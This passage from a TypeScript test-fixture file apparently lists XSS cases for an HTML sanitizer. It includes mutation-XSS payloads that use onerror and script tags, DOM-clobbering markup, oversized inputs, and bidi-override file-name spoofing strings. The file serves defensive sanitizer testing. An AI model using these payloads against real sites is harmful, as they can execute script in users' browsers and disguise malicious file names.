  web("style in svg with an a id", "mxss", '<svg></p><style><a id="</style><image src=1 onerror=alert(1)>">', { present: "svg" }),
  web("math mtext table mglyph style comment", "mxss", '<math><mtext><table><mglyph><style><!--</style><image title="--&gt;&lt;image src=1 onerror=alert(1)&gt;">', { present: "math" }),
  web("form math mtext form mglyph style", "mxss", "<form><math><mtext></form><form><mglyph><style></math><image src onerror=alert(1)>", { present: "form" }),
  web("textarea and title and plaintext", "mxss", '<textarea></textarea><title><image src=x onerror=alert(1)></title><plaintext><image src=y onerror=alert(2)>', { present: "textarea" }),
  web("select with a template and a style", "mxss", "<select><template><style><image src=x onerror=alert(1)></style></template></select>", { present: "select" }),
  web("template with a shadow root declared", "mxss", '<div><template shadowrootmode="open"><image src=x onerror="alert(1)"><script>alert(2)</script></template></div>', { present: "template" }),
  web("a nested table, caption and unknown element", "mxss", '<table><caption><svg><desc><table><tr><td><style></desc><image src=x onerror=alert(1)></style>', { present: "table" }),
  web("annotation-xml and encoding", "mxss", '<math><annotation-xml encoding="text/html"><image src=x onerror=alert(1)></annotation-xml></math>', { present: "annotation-xml" }),
  web("dom clobbering of the document and the window", "markup", '<form id="body"></form><img name="cookie"><a id="location" href="https://evil.example/"></a><a id="document"></a><a id="top"></a><a id="defaultView" name="defaultView"></a>', {
    present: "#location",
  }),
  web("a very long attribute and a very long text", "markup", `<p title="${"a".repeat(100_000)}">${"b".repeat(100_000)}</p>`, { present: "p" }),
  web("ten thousand elements", "markup", `<ul>${"<li>x</li>".repeat(10_000)}</ul>`, { present: "ul" }),
  web("bidi override in text", "control", "<p>invoice\u202etxt.exe</p>", { present: "p" }),
  web("bidi override in the text of a link", "control", a("https://docs.example/", "docs.example\u202e/moc.elpmaxe"), { present: "a" }),
  web("every bidi control character", "control", "<p>\u202a LRE \u202b RLE \u202c PDF \u202d LRO \u202e RLO \u2066 LRI \u2067 RLI \u2068 FSI \u2069 PDI \u200e LRM \u200f RLM \u061c ALM</p>", { present: "p" }),
  web("zero-width characters in text and in a heading id", "control", '<h1 id="doc-a\u200bb">a\u200bb\u200c\u200d\u2060\ufeffc</h1>', { present: "[id]" }),
  web("a line separator, a paragraph separator and a null in an attribute", "control", '<p title="a\u2028b\u2029c\u0000d">x</p>', { present: "p" }),
  web("lone surrogates and non-characters", "control", "<p>\ud800 \udc00 \ufffe \uffff \ufdd0</p>", { present: "p" }),
  web("a link in the allowlist", "benign", `<h2 id="doc-usage">Usage</h2><p>Read <a href="https://docs.example/guide" rel="noopener noreferrer">the guide</a> and <a href="/docs/view?path=%2Fgit%2Fmain%2Fdocs%2Faccount-sorting.md" rel="noopener noreferrer">this doc</a>.</p><pre><code>1 &lt; 2\n</code></pre><table><thead><tr><th>a</th></tr></thead><tbody><tr><td>b</td></tr></tbody></table><ul><li>one</li><li>two</li></ul>`, {
    present: "h2[id=doc-usage]",
    core: true,
  }),
];

export const CASES: readonly XssCase[] = [...FROM_CORPUS, ...FROM_CHECKER, ...FROM_WEB];

/** The names of the Rust lists, for the drift test: every one must be a case here. */
export const CORPUS_NAMES: readonly string[] = FROM_CORPUS.map((c) => c.name);
export const CHECKER_LABELS: readonly string[] = FROM_CHECKER.map((c) => c.name.replace(/^checker: /, ""));
